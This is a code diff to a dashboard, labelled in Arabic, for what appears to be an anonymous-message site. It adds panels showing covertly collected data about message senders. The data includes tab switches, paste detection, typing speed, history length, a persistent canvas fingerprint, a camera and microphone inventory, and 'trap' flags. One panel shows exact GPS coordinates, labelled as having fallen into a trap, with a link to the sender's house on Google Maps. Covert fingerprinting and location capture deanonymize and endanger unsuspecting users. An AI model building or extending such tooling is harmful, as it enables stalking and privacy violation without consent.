@@ -127,9 +127,31 @@ export default async function Dashboard() {
                   <div style={{ gridColumn: "span 2", borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: "0.5rem", marginBottom: "0.5rem", marginTop: "0.5rem", color: "var(--accent-color)", fontWeight: "bold" }}>🕵️ استخبارات وسلوكيات (حصري)</div>
                   <div><strong>🔗 المصدر (الرابط):</strong> <br/>{msg.referrer && msg.referrer !== "Direct" ? msg.referrer : "دخول مباشر"}</div>
                   <div><strong>⏱️ الثواني بالصفحة:</strong> <br/>{msg.timeSpent ? `${msg.timeSpent} ثانية` : "غير متاح"}</div>
-                  <div><strong>🕒 التايم زون (المنطقة الزمنية):</strong> <br/>{msg.timezone || "غير متاح"}</div>
+                  
+                  <div><strong>👁️ الخروج من الصفحة (هرب):</strong> <br/>{msg.tabSwitches > 0 ? <span style={{color:"#ef4444"}}>نعم ({msg.tabSwitches} مرات)</span> : "لم يغادر!"}</div>
+                  <div><strong>📋 حالة الكتابة:</strong> <br/>{msg.isPasted ? <span style={{color:"#ef4444"}}>نسخ ولصق ⚠️</span> : "كتبها بنفسه"}</div>
+                  <div><strong>⌨️ سرعة الكتابة:</strong> <br/>{msg.typingSpeed ? `${msg.typingSpeed} حرف/دقيقة` : "غير متاح"}</div>
+                  <div><strong>🕵️ عمق التصفح الدقيق:</strong> <br/>{msg.historyLength ? `${msg.historyLength} صفحات خلفية` : "غير متاح"}</div>
+                  
+                  <div><strong>🕒 التايم زون:</strong> <br/>{msg.timezone || "غير متاح"}</div>
                   <div><strong>🔙 مسح وتعديل الكتابة:</strong> <br/>{msg.backspacesCount ? `${msg.backspacesCount} مرة` : "لا يوجد"}</div>
+                  
                   <div style={{ gridColumn: "span 2" }}><strong>🍪 كود هوية الزائر (لمعرفة التكرار):</strong> <br/><span style={{ background:"rgba(255,255,255,0.1)", padding:"2px 6px", borderRadius:"4px", fontFamily:"monospace" }}>{msg.sessionId || "غير متاح"}</span></div>
+                  <div style={{ gridColumn: "span 2" }}><strong>🛡️ البصمة الحديدية (لا تتغير):</strong> <br/><span style={{ background:"rgba(255,255,255,0.1)", padding:"2px 6px", borderRadius:"4px", fontFamily:"monospace", color: "#4ade80" }}>{msg.canvasFingerprint || "غير متاح"}</span></div>
+                  
+                  {msg.exactLocation && (
+                    <div style={{ gridColumn: "span 2", background: "rgba(16, 185, 129, 0.1)", padding: "0.5rem", borderRadius: "8px", borderLeft: "3px solid #10b981" }}>
+                      <strong>📍 موقع الـ GPS الدقيق (وقع في الفخ):</strong> <br/>
+                      <a href={`https://www.google.com/maps?q=${msg.exactLocation}`} target="_blank" style={{ color: "#10b981", textDecoration: "underline" }}>افتح بيته على خرائط جوجل 🗺️</a>
+                    </div>
+                  )}
+
+                  {msg.fellForTrap && (
+                    <div style={{ gridColumn: "span 2", background: "rgba(239, 68, 68, 0.2)", padding: "0.5rem", borderRadius: "8px", borderLeft: "3px solid #ef4444", color: "#fca5a5" }}>
+                      <strong>🚨 إنذار فخ الفضول:</strong> <br/>
+                      هذا الشخص قام بالضغط على الرابط الخفي لمحاولة كشف هويتك! (فضولي جداً)
+                    </div>
+                  )}
                   
                   <div style={{ gridColumn: "span 2", borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: "0.5rem", marginBottom: "0.5rem", marginTop: "0.5rem", color: "var(--accent-color)", fontWeight: "bold" }}>🖥️ مواصفات الجهاز</div>
                   <div><strong>📱 الجهاز:</strong> <br/>{msg.deviceType}{extractPhoneModel(msg.userAgent)}</div>
@@ -137,7 +159,9 @@ export default async function Dashboard() {
                   <div><strong>🖥️ الشاشة:</strong> <br/>{msg.screenResolution || "غير متاح"}</div>
                   <div><strong>👆 دعم اللمس:</strong> <br/>{msg.isTouch || "غير متاح"}</div>
                   
-                  <div style={{ gridColumn: "span 2", borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: "0.5rem", marginBottom: "0.5rem", marginTop: "0.5rem", color: "var(--accent-color)", fontWeight: "bold" }}>⚙️ العتاد (الهاردوير)</div>
+                  <div style={{ gridColumn: "span 2", borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: "0.5rem", marginBottom: "0.5rem", marginTop: "0.5rem", color: "var(--accent-color)", fontWeight: "bold" }}>⚙️ الشبكة والعتاد</div>
+                  <div><strong>📡 نوع الاتصال:</strong> <br/>{msg.networkType || "غير متاح"}</div>
+                  <div style={{ gridColumn: "span 2" }}><strong>🎥 حصر الكاميرات والمايكات:</strong> <br/>{msg.devicesInfo || "غير متاح"}</div>
                   <div><strong>🧠 الرامات:</strong> <br/>{msg.ramSize || "غير متاح"}</div>
                   <div><strong>⚙️ المعالج (Cores):</strong> <br/>{msg.cpuCores || "غير متاح"}</div>
                   <div style={{ gridColumn: "span 2" }}><strong>🎮 كارت الشاشة (GPU):</strong> <br/>{msg.gpuModel || "غير متاح"}</div>
